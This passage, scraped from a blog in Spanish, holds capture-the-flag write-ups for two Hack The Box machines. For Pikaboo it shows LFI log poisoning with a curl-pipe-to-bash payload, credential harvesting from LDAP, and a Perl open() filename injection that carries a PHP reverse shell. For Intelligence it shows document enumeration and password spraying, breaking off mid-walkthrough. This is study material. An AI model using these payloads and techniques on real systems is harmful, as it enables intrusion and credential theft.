usuario es www-data por lo que ejecutamos una shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log Thu Jul 22 01:53:34 2021 [pid 6954] CONNECT: Client \u0026#34;::ffff:10.10.14.24\u0026#34; Thu Jul 22 01:53:34 2021 [pid 6954] FTP response: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;220 (vsFTPd 3.0.3)\u0026#34; Thu Jul 22 01:53:35 2021 [pid 6954] FTP command: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;USER www-data www-data\u0026#34; Thu Jul 22 01:53:35 2021 [pid 6954] [www-data www-data] FTP response: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;331 Please specify the password.\u0026#34; Thu Jul 22 01:53:38 2021 [pid 6954] [www-data www-data] FTP command: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;PASS \u0026lt;password\u0026gt;\u0026#34; Thu Jul 22 01:53:38 2021 [pid 6953] [www-data www-data] FAIL LOGIN: Client \u0026#34;::ffff:10.10.14.24\u0026#34; Thu Jul 22 01:53:39 2021 [pid 6954] [www-data www-data] FTP response: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;530 Login incorrect.\u0026#34; Thu Jul 22 01:53:39 2021 [pid 6954] FTP command: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;SYST\u0026#34; Thu Jul 22 01:53:39 2021 [pid 6954] FTP response: Client \u0026#34;::ffff:10.10.14.24\u0026#34;, \u0026#34;530 Please login with USER and PASS.\u0026#34; www-data - User Utilizamos reverse shell as a service en la version de InfosecJack para generar una shell inversa y en el codigo PHP descargamos y ejecutamos la shell.\n1 \u0026lt;?php echo(system(\u0026#39;curl 10.10.14.24/x|bash\u0026#39;)); ?\u0026gt; Obtuvimos una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/pikaboo ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.24] from 10.10.10.249 [10.10.10.249] 38126 /bin/sh: 0: can\u0026#39;t access tty; job control turned off www-data@pikaboo:/var/www/html/admin_staging$ which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@pikaboo:/var/www/html/admin_staging$ whoami; id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@pikaboo:/var/www/html/admin_staging$ Y realizamos la lectura de la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 www-data@pikaboo:/var/www$ cat /etc/passwd|grep home pwnmeow:x:1000:1000:,,,:/home/pwnmeow:/bin/bash www-data@pikaboo:/var/www$ ls -lah /home/pwnmeow total 580K drwxr-xr-x 2 pwnmeow pwnmeow 556K Jul 6 20:02 . drwxr-xr-x 3 root root 4.0K May 10 10:26 .. lrwxrwxrwx 1 root root 9 Jul 6 20:02 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 pwnmeow pwnmeow 220 May 10 10:26 .bash_logout -rw-r--r-- 1 pwnmeow pwnmeow 3.5K May 10 10:26 .bashrc -rw-r--r-- 1 pwnmeow pwnmeow 807 May 10 10:26 .profile lrwxrwxrwx 1 root root 9 Jul 6 20:01 .python_history -\u0026gt; /dev/null -r--r----- 1 pwnmeow www-data 33 Jul 22 00:40 user.txt www-data@pikaboo:/var/www$ cat /home/pwnmeow/user.txt 2b4e6a139700d43db0960bfe88fb2d32 www-data@pikaboo:/var/www$ pwnmeow - FTP Enumerando los directorios vemos la app pokeapi en /opt dentro de la configuracion del proyecto encontramos credenciales para LDAP.\n1 2 3 4 5 6 7 8 9 10 11 12 DATABASES = { \u0026#34;ldap\u0026#34;: { \u0026#34;ENGINE\u0026#34;: \u0026#34;ldapdb.backends.ldap\u0026#34;, \u0026#34;NAME\u0026#34;: \u0026#34;ldap:///\u0026#34;, \u0026#34;USER\u0026#34;: \u0026#34;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#34;, \u0026#34;PASSWORD\u0026#34;: \u0026#34;J~42%W?PFHl]g\u0026#34;, }, \u0026#34;default\u0026#34;: { \u0026#34;ENGINE\u0026#34;: \u0026#34;django.db.backends.sqlite3\u0026#34;, \u0026#34;NAME\u0026#34;: \u0026#34;/opt/pokeapi/db.sqlite3\u0026#34;, } } Tambien observamos que el puerto 389 (ldap) esta a la escucha localmente y ldapsearch esta instalado en la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@pikaboo:/opt/pokeapi/config$ netstat -ntpl Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:389 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 618/nginx: worker p tcp 0 0 127.0.0.1:81 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN 618/nginx: worker p tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - www-data@pikaboo:/opt/pokeapi/config$ which ldapsearch /usr/bin/ldapsearch www-data@pikaboo:/opt/pokeapi/config$ Obtuvimos informacion en LDAP donde observamos la contraseña de pwnmeow codificada en base64.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 www-data@pikaboo:/opt/pokeapi/config$ ldapsearch -x -h localhost -D \u0026#39;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#39; -w \u0026#39;J~42%W?PFHl]g\u0026#39; -b \u0026#34;cn=users,dc=pikaboo,dc=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;dc=pikaboo,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # pikaboo.htb dn: dc=pikaboo,dc=htb objectClass: domain dc: pikaboo # ftp.pikaboo.htb dn: dc=ftp,dc=pikaboo,dc=htb objectClass: domain dc: ftp # users, pikaboo.htb dn: ou=users,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users # pokeapi.pikaboo.htb dn: dc=pokeapi,dc=pikaboo,dc=htb objectClass: domain dc: pokeapi # users, ftp.pikaboo.htb dn: ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users # groups, ftp.pikaboo.htb dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups # pwnmeow, users, ftp.pikaboo.htb dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount uid: pwnmeow cn: Pwn sn: Meow loginShell: /bin/bash uidNumber: 10000 gidNumber: 10000 homeDirectory: /home/pwnmeow userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== # binduser, users, pikaboo.htb dn: cn=binduser,ou=users,dc=pikaboo,dc=htb cn: binduser objectClass: simpleSecurityObject objectClass: organizationalRole userPassword:: Sn40MiVXP1BGSGxdZw== # users, pokeapi.pikaboo.htb dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users # groups, pokeapi.pikaboo.htb dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups # search result search: 2 result: 0 Success # numResponses: 11 # numEntries: 10 www-data@pikaboo:/opt/pokeapi/config$ Con esta contraseña obtuvimos acceso por FTP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/pikaboo ❯ ftp 10.10.10.249 # _G0tT4_C4tcH_\u0026#39;3m_4lL!_ Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) Name (10.10.10.249:kali): pwnmeow 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx-wx--- 2 ftp ftp 4096 May 20 09:54 abilities [... REDACTED ...] drwx-wx--- 2 ftp ftp 4096 Jul 06 20:20 versions 226 Directory send OK. ftp\u0026gt; Privesc Descubrimos un cronjob ejecutado por root, utiliza csvupdate para cada uno de los archivos en /srv/ftp/, en este ultimo unicamente estan permitidos el usuario root y los usuarios pertenecientes a ftp como pwnmeow.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 www-data@pikaboo:/$ cat /etc/crontab | grep -v \u0026#34;#\u0026#34; SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root /usr/local/bin/csvupdate_cron www-data@pikaboo:/$ file /usr/local/bin/csvupdate_cron /usr/local/bin/csvupdate_cron: Bourne-Again shell script, ASCII text executable www-data@pikaboo:/$ cat /usr/local/bin/csvupdate_cron #!/bin/bash for d in /srv/ftp/* do cd $d /usr/local/bin/csvupdate $(basename $d) *csv /usr/bin/rm -rf * done www-data@pikaboo:/$ file /usr/local/bin/csvupdate /usr/local/bin/csvupdate: Perl script text executable www-data@pikaboo:/$ wc -l /usr/local/bin/csvupdate 231 /usr/local/bin/csvupdate www-data@pikaboo:/$ ls -ld /srv/ftp/ drwxr-xr-x 176 root ftp 12288 May 20 08:01 /srv/ftp/ www-data@pikaboo:/$ id pwnmeow uid=1000(pwnmeow) gid=1000(pwnmeow) groups=1000(pwnmeow),115(ftp) www-data@pikaboo:/$ El script realiza la lectura de archivos .csv obtiene las celdas y verifica que tiene el numero de campos definidos en %csv_fields, si es correcto finaliza escribiendo el contenido del /srv/ftp/[archivo].csv en /opt/pokeapi/data/v2/csv/[tipo].csv.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #!/usr/bin/perl # [... REDACTED ...] use strict; use warnings; use Text::CSV; my $csv_dir = \u0026#34;/opt/pokeapi/data/v2/csv\u0026#34;; my %csv_fields = ( \u0026#39;abilities\u0026#39; =\u0026gt; 4, # [... REDACTED ...] \u0026#39;versions\u0026#39; =\u0026gt; 3 ); if($#ARGV \u0026lt; 1){ die \u0026#34;Usage: $0 \u0026lt;type\u0026gt; \u0026lt;file(s)\u0026gt;\\n\u0026#34;; } my $type = $ARGV[0]; if(!exists $csv_fields{$type}){ die \u0026#34;Unrecognised CSV data type: $type.\\n\u0026#34;; } my $csv = Text::CSV-\u0026gt;new({ sep_char =\u0026gt; \u0026#39;,\u0026#39; }); my $fname = \u0026#34;${csv_dir}/${type}.csv\u0026#34;; open(my $fh, \u0026#34;\u0026gt;\u0026gt;\u0026#34;, $fname) or die \u0026#34;Unable to open CSV target file.\\n\u0026#34;; shift; for(\u0026lt;\u0026gt;){ chomp; if($csv-\u0026gt;parse($_)) { my @fields = $csv-\u0026gt;fields(); if(@fields != $csv_fields{$type}) { warn \u0026#34;Incorrect number of fields: \u0026#39;$_\u0026#39;\\n\u0026#34;; next; } print $fh \u0026#34;$_\\n\u0026#34;; } } close($fh); Tras analizar las librerias no encontramos algun tipo de vulnerabilidad pero algunas funciones de Perl se mencionan ser vulnerables (1, 2, 3, 4) especificamente open() en este caso. Segun la informacion un archivo que comienza con | es interpretado como un comando.\nIf the filename begins with \u0026ldquo;|\u0026rdquo;, the filename is interpreted as a command to which output is to be piped, and if the filename ends with a \u0026ldquo;|\u0026rdquo;, the filename is interpreted as a command which pipes output to us.\nEn tal caso podriamos ejecutar comandos creando un archivo con una shell inversa, además debemos de agregar csv ya que el cronjob toma todos los archivos con estos caracteres. Utilizamos Thunar para crear el archivo.\n1 |php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.24\u0026#34;,1338);exec(\u0026#34;sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39;|csv Por alguna razon el archivo no se muestra en Thunar y por FTP tras subir dicho archivo.\nAunque al pasar algunos segundos obtuvimos una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/pikaboo ❯ bash -c \u0026#39;rlwrap nc -lvp 1338\u0026#39; listening on [any] 1338 ... connect to [10.10.14.24] from 10.10.10.249 [10.10.10.249] 44940 can\u0026#39;t access tty; job control turned off python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@pikaboo:/srv/ftp/abilities# whoami; id; pwd root uid=0(root) gid=0(root) groups=0(root) /srv/ftp/abilities root@pikaboo:/srv/ftp/abilities# cd root@pikaboo:~# ls root.txt vsftpd.log root@pikaboo:~# cat root.txt cat root.txt 31ea660be5feed8e26eea494874fb2fa root@pikaboo:~# cat /home/pwn*/user.txt b6b20e171c3d5d3425f7bfaafea34501 root@pikaboo:~# ","description":"Pikaboo presenta una vulnerabilidad LFI donde realizamos LFI Log Poisoning por donde obtuvimos acceso. Acceso por LDAP localmente nos permitio acceder a otro usuario por FTP. Finalmente para escalar privilegios explotamos una vulnerabilidad en una funcion de perl.","id":41,"section":"posts","tags":["lfi","lfi log poisoning","nginx","ldap","perl","nginx misc"],"title":"Hack The Box - Pikaboo","uri":"https://sckull.github.io/posts/pikaboo/"},{"content":"\rEn Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar \u0026lsquo;Password Spraying\u0026rsquo; lo que nos dio acceso a un primer usuario. Encontramos un script en un recurso de samba lo que nos permitió obtener el hash de un segundo usuario tras ejecutar Responder y krbrelayx. Bloodhound nos mostró que uno de los usuarios tiene la caracteristica de leer constraseñas de cuentas gMSA, este ultimo tambien tiene caracteristicas \u0026lsquo;Delegation\u0026rsquo; sobre el DC, con esta informacion obtuvimos acceso como administrador con gMSADumper y impacket.\nNombre Intelligence OS Windows Puntos 30 Dificultad Media IP 10.10.10.248 Maker Micah\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.2, 6.5, 4.9, 5.1, 3.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 5, 5, 5, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), kerberos (88), ldap (389, 636, 3268, 3269), dns (53), winrm (5985), smb (139, 445).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 # Nmap 7.91 scan initiated Wed Jul 7 23:38:51 2021 as: nmap -Pn -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49685,49686,49706,49712,53942 -oN scans 10.10.10.248 Nmap scan report for 10.10.10.248 (10.10.10.248) Host is up (0.069s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-08 09:33:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-08T09:35:40+00:00; +5h55m05s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-08T09:35:39+00:00; +5h55m04s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-08T09:35:40+00:00; +5h55m05s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-08T09:35:39+00:00; +5h55m04s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49686/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49712/tcp open msrpc Microsoft Windows RPC 53942/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 5h55m03s, deviation: 2s, median: 5h55m03s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-08T09:34:55 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 7 23:40:35 2021 -- 1 IP address (1 host up) scanned in 104.26 seconds Web Site Encontramos una pagina estatica en el puerto 80, además muestra algunos PDFs que contienen texto Lorem Ipsum.\nDirectory Brute Forcing Feroxbuster mostró unicamente la carpeta donde estan los PDFs.\n1 2 3 [####################] - 28m 220545/220545 127/s http://intelligence.htb/ [####################] - 30m 220545/220545 120/s http://intelligence.htb/documents [####################] - 29m 220545/220545 124/s http://intelligence.htb/Documents Subdominios Realizamos una enumeracion de subdominios utilizando dnscan. Encontramos algunos subdominios y direccion ipv6, los subdominios no muestra informacion por http.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/intelligence ❯ ~/tools/dnscan/dnscan.py -d intelligence.htb -w ~/tools/dnscan/all.txt -R 10.10.10.248 -n [*] Processing domain intelligence.htb [*] Using specified resolvers: 10.10.10.248 [+] Getting nameservers 10.10.10.248 - dc.intelligence.htb [-] Zone transfer failed [+] IPv6 (AAAA) records found. Try running dnscan with the -6 option. dead:beef::3d59:f88a:8e8d:a571 [-] DNSSEC not supported [*] Scanning intelligence.htb for A records 10.10.10.248 - intelligence.htb 10.10.10.248 - dc.intelligence.htb 10.10.10.248 - domaindnszones.intelligence.htb 10.10.10.248 - forestdnszones.intelligence.htb Documentos Los PDFs que se muestran en la pagina estan dentro de /documents/ y cada uno de ellos tiene una fecha mas el valor \u0026lsquo;upload\u0026rsquo;, creamos un pequeño script en python para realizar una enumeracion de documentos existentes para buscar informacion sensible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #!/usr/bin/env python3 import requests def zero(n): return str(n) if int(n) \u0026gt; 9 else str(\u0026#34;0\u0026#34;+str(n)) for a in range(2015, 2023): print(f\u0026#34;Init: {a}\u0026#34;) for b in range(0,13): for c in range(0,32): # Ex: http://intelligence.htb/documents/2020-12-30-upload.pdf url = f\u0026#34;http://intelligence.htb/documents/{a}-{zero(b)}-{zero(c)}-upload.pdf\u0026#34; r = requests.get(url) if r.status_code != 404: print(url) print(f\u0026#34;Finish: {a}\u0026#34;) Tras ejecutar el script encontramos una gran cantidad de documentos, abrimos cada uno de estos y solo en dos de ellos encontramos informacion relacionada a una cuenta de usuario y actualizacion de parte de \u0026lsquo;IT\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/intelligence ❯ ./enum_docs.py Init: 2015 Finish: 2015 Init: 2016 Finish: 2016 Init: 2017 Finish: 2017 Init: 2018 Finish: 2018 Init: 2019 Finish: 2019 Init: 2020 [... REDACTED ...] http://intelligence.htb/documents/2020-06-04-upload.pdf \u0026lt;\u0026lt;------- [... REDACTED ...] http://intelligence.htb/documents/2020-12-24-upload.pdf http://intelligence.htb/documents/2020-12-28-upload.pdf http://intelligence.htb/documents/2020-12-30-upload.pdf \u0026lt;\u0026lt;------- Finish: 2020 Init: 2021 http://intelligence.htb/documents/2021-01-03-upload.pdf http://intelligence.htb/documents/2021-01-14-upload.pdf [... REDACTED ...] http://intelligence.htb/documents/2021-03-25-upload.pdf http://intelligence.htb/documents/2021-03-27-upload.pdf Finish: 2021 Init: 2022 Finish: 2022 Intentamos utilizar la contraseña y usuario (NewIntelligenceCorpUser9876:Ted) pero en ningun puerto/servicio fue aceptada la combinacion.\n1 2 3 4 5 6 7 8 9 10 11 # http://intelligence.htb/documents/2020-06-04-upload.pdf New Account Guide Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876 After logging in please change your password as soon as possible # http://intelligence.htb/documents/2020-12-30-upload.pdf Internal IT Update There has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again. Also, after discussion following our recent security audit we are in the processof locking down our service accounts. Exiftool Tras ejecutar exiftool a los PDFs vemos posibles nombres de usuarios en los metadatos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 π ~/htb/intelligence/docs ❯ exiftool * ======== 2020-06-04-upload.pdf ExifTool Version Number : 12.16 File Name : 2020-06-04-upload.pdf Directory : . File Size : 26 KiB File Modification Date/Time : 2021:04:01 13:00:00-04:00 File Access Date/Time : 2021:07:08 03:17:02-04:00 File Inode Change Date/Time : 2021:07:08 03:16:59-04:00 File Permissions : rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : Jason.Patterson ======== 2020-12-30-upload.pdf ExifTool Version Number : 12.16 File Name : 2020-12-30-upload.pdf Directory : . File Size : 25 KiB File Modification Date/Time : 2021:04:01 13:00:00-04:00 File Access Date/Time : 2021:07:08 03:17:13-04:00 File Inode Change Date/Time : 2021:07:08 03:17:10-04:00 File Permissions : rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : Jason.Patterson 2 image files read π ~/htb/intelligence/docs ❯ Con algunas modificaciones en el script y con informacion que encontramos creamos el wordlist users.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 import requests, exiftool, wget, glob, os # pip3 install PyExifTool # pip3 install wget def zero(n): return str(n) if int(n) \u0026gt; 9 else str(\u0026#34;0\u0026#34;+str(n)) def get_usernames(files: list): user = [] with exiftool.ExifTool() as et: metadata = et.get_metadata_batch(files) for d in metadata: user.append(d[\u0026#39;PDF:Creator\u0026#39;]) return user # All .pdf for a in range(2020, 2022): print(f\u0026#34;Init: {a}\u0026#34;) for b in range(0,13): for c in range(0,32): url = f\u0026#34;http://intelligence.htb/documents/{a}-{zero(b)}-{zero(c)}-upload.pdf\u0026#34; r = requests.get(url) if r.status_code != 404: wget.download(url) print(f\u0026#34;Finish: {a}\u0026#34;) # All files ending with .pdf to users.txt with open(\u0026#39;users.txt\u0026#39;, \u0026#39;a\u0026#39;) as the_file: for i in get_usernames(glob.glob(os.getcwd()+\u0026#34;/*.pdf\u0026#34;)): the_file.write(f\u0026#34;{i}\\n\u0026#34;) Al finalizar la ejecucion encontramos 30 \u0026ldquo;nombres y apellidos\u0026rdquo;, utilizamos sort y uniq para eliminar los duplicados.\n1 2 3 4 5 6 7 8 π ~/htb/intelligence/docs ❯ ./enum_docs.py Init: 2020 100% [..............................................................................] 25109 / 25109Finish: 2020 Init: 2021 100% [..............................................................................] 12127 / 12127Finish: 2021 π ~/htb/intelligence/docs ❯ cat users.txt|sort|uniq|wc -l 30 π ~/htb/intelligence/docs ❯ Tiffany - User Password Spraying Utilizamos la contraseña junto con el wordlist de usuarios para realizar Password Spraying. Logramos encontrar una combinacion de usuario:contraseña aceptada en Samba y Ldap.\n1 2 3 4 5 π ~/htb/intelligence/docs ❯ crackmapexec smb intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876|grep + SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 π ~/htb/intelligence/docs ❯ crackmapexec ldap intelligence.htb -u usersV2.txt -p NewIntelligenceCorpUser9876|grep + LDAP 10.10.10.248 389 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 π ~/htb/intelligence/docs ❯ SMB Tras enumerar los recursos en SAMBA vemos que sobresaltan Users y IT.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/intelligence ❯ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H intelligence.htb [+] IP: intelligence.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC IT READ ONLY NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share Users READ ONLY π ~/htb/intelligence ❯ Ingresamos al recurso Users donde encontramos la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/intelligence ❯ smbclient \\\\\\\\intelligence.htb\\\\Users -U Tiffany.Molina # NewIntelligenceCorpUser9876 Enter WORKGROUP\\Tiffany.Molina\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Sun Apr 18 21:20:26 2021 .. DR 0 Sun Apr 18 21:20:26 2021 Administrator D 0 Sun Apr 18 20:18:39 2021 All Users DHSrn 0 Sat Sep 15 03:21:46 2018 Default DHR 0 Sun Apr 18 22:17:40 2021 Default User DHSrn 0 Sat Sep 15 03:21:46 2018 desktop.ini AHS 174 Sat Sep 15 03:11:27 2018 Public DR 0 Sun Apr 18 20:18:39 2021 Ted.Graves D 0 Sun Apr 18 21:20:26 2021 Tiffany.Molina D 0 Sun Apr 18 20:51:46 2021 3770367 blocks of size 4096. 1460874 blocks available smb: \\\u0026gt; cd Tiffany.Molina\\ smb: \\Tiffany.Molina\\\u0026gt; cd Desktop\\ smb: \\Tiffany.Molina\\Desktop\\\u0026gt; ls . DR 0 Sun Apr 18 20:51:46 2021 .. DR 0 Sun Apr 18 20:51:46 2021 user.txt AR 34 Sun Jul 11 02:15:29 2021 3770367 blocks of size 4096. 1460874 blocks available smb: \\Tiffany.Molina\\Desktop\\\u0026gt; get user.txt getting file \\Tiffany.Molina\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\Tiffany.Molina\\Desktop\\\u0026gt; exit π ~/htb/intelligence ❯ cat 